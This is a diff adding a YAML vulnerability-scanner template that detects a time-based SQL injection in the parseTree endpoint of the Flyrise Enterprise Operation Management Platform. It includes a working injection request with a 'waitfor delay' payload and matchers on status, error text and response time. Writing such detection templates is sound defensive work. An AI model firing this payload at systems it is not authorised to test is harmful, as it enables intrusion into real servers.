@@ -1,0 +1,31 @@
+id: flyrise-enterprise-parsetree-sqli
+info:
+  name: Flyrise Enterprise Operation Management Platform Parsetree SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the parsetree functionality of the Flyrise Enterprise Operation Management Platform.
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 1}}'
+
+http:
+  - raw:
+      - |
+        GET /common/parseTree.js%70?code=1%27;waitfor+delay+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{BaseURL}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "服务器错误"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
